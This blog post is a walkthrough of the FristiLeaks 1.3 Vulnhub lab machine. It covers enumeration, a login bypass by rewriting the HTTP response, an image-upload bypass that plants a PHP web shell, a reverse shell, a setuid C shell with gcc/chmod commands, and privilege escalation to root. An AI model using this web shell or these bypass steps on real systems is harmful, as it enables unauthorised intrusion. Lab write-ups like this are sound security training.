<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title> FristiLeaks 1.3 Write-Up —  &raquo;  Barvent</title>
<meta name="description" content="Barvent's technology blog
">
<meta name="keywords" content="">
<link rel="canonical" href="http://localhost:4000/write-ups/fristileaks_1.3_writeup/">
        




<!-- Twitter Cards -->
<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="FristiLeaks 1.3 Write-Up" />
<meta name="twitter:description" content="Barvent's technology blog
" />
<meta name="twitter:image" content="http://localhost:4000" />

<!-- Google plus -->
<meta name="author" content="">
<link rel="author" href="">

<!-- Open Graph -->
<meta property="og:locale" content="">
<meta property="og:type" content="article">
<meta property="og:title" content="FristiLeaks 1.3 Write-Up">
<meta property="og:description" content="Barvent's technology blog
">
<meta property="og:url" content="http://localhost:4000/write-ups/fristileaks_1.3_writeup/">
<meta property="og:site_name" content="Barvent">

        <link href='https://fonts.googleapis.com/css?family=Inconsolata:400,700' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="/assets/vendor/normalize-css/normalize.css">
<link rel="stylesheet" href="/css/main.css">

  <link rel="stylesheet" href="/assets/vendor/highlight/styles/solarized_dark.css">

<link rel="stylesheet" href="/assets/vendor/font-awesome/css/font-awesome.css">

    </head>

    <body>
        <div class="wrapper">
            <header class="header">
    <div class="navigation">
        <a href="/" class="logo">Barvent</a>

        <ul class="menu">
            <li class="menu__entry"><a href="/about">About</a></li>
            <li class="menu__entry"><a href="/">Blog</a></li>
            <li class="menu__entry"><a href="/categories">Categories</a></li>
        </ul>
    </div>

    <ul class="social-links">
        

        
    </ul>
</header>

            <h1 class="page-title post-title">
    <div class="page-title__text post-title__text">FristiLeaks 1.3 Write-Up</div>
    <div class="page-title__subtitle post-title__subtitle"></div>
</h1>

<div class="content">
    <p>FristiLeaks is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.<br /><br /></p>
<h1>Port Scan</h1>
<p>Normally, the first thing to do when dealing with Vulnhub machines is to scan the network (I use Nmap to do so) to find the IP of the vulnerable machine, 
but in this case the machine tells us its IP in the login prompt. 
<img src="allPortsScan.png" alt="Port scan result" /></p>

<p>In the scan we can see that the only open port is 80, which usually is HTTP.
<br /><br /></p>
<h1>Port 80 Initial Enumeration</h1>
<p><img src="port80Nmap.png" alt="Nmap output for port 80" />
In the Nmap output for port 80 using the default scripts we can see that robots.txt has three disallowed entries. Also, we can see that the webserver uses 
Apache httpd 2.2.15, PHP version 5.3.3 and the distribution is CentOS.
<br /><br />
The root page of the web has nothing interesting at first glance, but there is this image which will be useful later.
<img src="KeepCalm.png" alt="KeepCalm" />
Also, inside of the robots.txt file we can see the three disallowed entries.
<img src="robots.png" alt="Robots file" />
All the disallowed entries have the same image saying “This is not the URL you were looking for” (I didn’t get a screenshot of this). 
At this point I wasn’t sure about what to do, as I didn’t find any interesting vulnerabilities for the server and neither did both Nikto and gobuster.
<br />
Using a bit of guess work I found the directory fristi. All the entries in the robots.txt are drinks and, according to the image, fristi is also a drink. Maybe using a 
wordlist generated by CEWL and gobuster you can find the directory, but I didn’t think about this when I was enumerating the box.
<br /><br /></p>
<h1>Fristi Directory</h1>
<p>The index.php file of this directory is a login page which isn’t vulnerable to SQLInjection (or at least I couldn’t find it), but I found two different ways to
“bypass” it.<br /></p>
<h2>First Method</h2>
<p>In the source code we can see some interesting comments.
<img src="fristiCom0.png" alt="First commentary" /> 
<img src="fristiCom1.png" alt="Second commentary" />
<img src="fristiCom2.png" alt="Third commentary" />
We get a possible username (eezeepz) inside of the first commentary and a base64 encoded image. If we decode it we can see that it is a PNG image.
<img src="decodeFristiImg.png" alt="Decoding" />
<img src="decodedFristiImg.png" alt="Decoded" />
Here we can guess that the user “eezeepz” has the password “keKkeKKeKKeKkEkkEk”. A successful login redirects us to the “upload.php” page.
<br /></p>
<h2>Second Method</h2>
<p>Using gobuster with the .php extension we can find the “uploads” directory, which hasn’t directory listing activated and “upload.php”, which redirects us to the login page.
<br />
Intercepting the request to “upload.php” using BurpSuite we can see that there is more content below the redirection. If we rewrite the status code (302 FOUND) to 200 OK, we can see the upload page without knowing the credentials.
<img src="burpIntercept.png" alt="BurpSuite request interception" /> 
<br /></p>
<h1>File Upload + RCE</h1>
<p>The page only allows uploading images, but it can be bypassed easily. You just need to change the <a href="https://en.wikipedia.org/wiki/List_of_file_signatures">magic bytes</a> to something that will be detected as an image, as well as using the correct extension.
<br />
I didn’t try using the correct extension without changing the magic bytes, but it probably doesn’t work. In my case, I used GIF87a as the magic bytes and created a really simple php shell to test if the RCE was possible.</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php">GIF87a
#The echo is redundant, as system prints the output of the command executed.
<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span><span class="cp">?&gt;</span> </code></pre></figure>

<p><img src="uploadShell.png" alt="Uploading of the shell" />
<img src="correctUpload.png" alt="Correct upload" />
This shell works pretty well, but it can’t execute commands that need arguments (strangely, it works fine in my machine, hosting the shell using php -S localhost:8000).
<br />
To use it you just need to pass the command inside the cmd argument, it accepts both GET and POST requests. In my case, I executed the whoami command.
<img src="simpleRCE.png" alt="Code execution" />
After I checked that the simple shell really worked, I uploaded a php reverse shell (the one inside /usr/share/webshells/php/php-reverse-shell.php on Kali) and set a listener on port 1234.
<img src="revShell.png" alt="Reverse shell" />
<br /></p>
<h1>Apache Shell</h1>
<p>The first thing I did was upgrading the shell to a <a href="https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/">more functional one</a>.
<img src="upgradingShell.png" alt="Shell upgrade" />
Inside the “checklogin.php” file we can get the hardcoded mysql credentials, but we can only read the username and the password required to access the “upload.php” page.
<img src="mysqlCreds.png" alt="Creds" />
Inside the file located at “/var/www/notes.txt” there is an interesting message.
<img src="notes1.png" alt="Notes.txt 1" />
If we go to the “/home/eezeepz” directory we can see lots of uninteresting files and another notes.txt.
<img src="notes2.png" alt="Notes.txt 2" />
Essentially this is saying that we can run commands as another user. I found two ways to exploit this, but I only used the easiest as the other one was too time consuming.</p>
<h2>First Method (not used)</h2>
<p>Looking inside the “/usr/bin/” directory we can see the gcc binary, so I created a pretty simple C shell that uses the “setuid()” system call to run as another user.<br />
My idea is to upload the file to the box (using the http.server module in python3 to serve the file), make the other user compile the shell and setting the SetUID bit, as well as giving execute permissions to others.<br />
The shell that I used was really simple for the sake of saving time, but I could have used a more interactive shell if it was necessary.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Usage: ./shell &lt;command&gt; &lt;uid&gt;  (no arguments for the command)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="n">uid</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">perror</span><span class="p">(</span><span class="s">"Setuid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">execl</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">perror</span><span class="p">(</span><span class="s">"Error executing command</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Inside the “/tmp/runthis” file I wrote the necessary commands to do this and I read the uid from the “/etc/passwd” file, which I’m not including because it’s too large.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/usr/bin/gcc /tmp/shell.c <span class="nt">-o</span> /tmp/shell
/home/admin/chmod u+s /tmp/shell
/home/admin/chmod o+x /tmp/shell</code></pre></figure>

<p><img src="shellPermission.png" alt="Shell permissions" />
<img src="shellExecution.png" alt="Execution" />
<br /></p>
<h2>Second Method + PrivEsc</h2>
<p>We can read the “/home/admin/” directory if we change the permissions using the “/tmp/runit” file and the chmod command.<br />
Inside this directory there are two seemingly encrypted files (cryptedpass.txt and whoisyourgodnow.txt) and a python script which encrypts them (I didn’t take a screenshot of this, I don’t know why).
<br />
The python script only base64 encodes the supplied password, then it reverses it and finally it encrypts it using the ROT13 method. If we reverse these steps, we can read the plaintext password.
<img src="cryptedPass.png" alt="Crypted pass" />
<img src="whogodPass.png" alt="Whogod pass" />
The first picture has the unencrypted text inside of “cyptedpass.txt”, while the second has the text inside “whoisyourgodnow.txt”.<br />
LetThereBeFristi! (inside whoisyourgodnow.txt) is the password for the fristigod user.
<br /><br /></p>
<h1>Root PrivEsc</h1>
<p>Executing the “sudo -l” command as user fristigod and supplying the “LetThereBeFristi!” password outputs this:
<img src="sudoL.png" alt="sudo -l output" />
And if we check the “/var/fristigod/.secret_admin_stuff/” we can see that the doCom binary has the SetUid bit and is owned by root.
<img src="ls_fristigod.png" alt="ls /var/fristigod/.secret_admin_stuff/" />
Using the “sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom” command we can check the usage of this binary, which allows us to run commands as root.
<br />
Running the “/bin/bash” command grants us an interactive shell as root and then we can read the flag inside “/root/fristileaks_secrets.txt”.
<img src="rootPrivEsc.png" alt="Root privesc" />
<br /></p>
<h1>Conclusion</h1>
<p>This is a fairly easy box, although I got stucked for while at the first part because I didn’t guess that fristi was the correct directory.
<br />
I’ve learnt how to use the setuid() system call, which I think is pretty useful and that I need to take more screenshots before reporting.</p>

</div>

<div class="about">
    <div class="about__devider">*****</div>
    <div class="about__text">
        Written by <strong>  Barvent </strong>
        on <strong>28 June 2020</strong>
    </div>
</div>


        </div>

        <script src="/assets/vendor/highlight/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
        
    </body>
</html>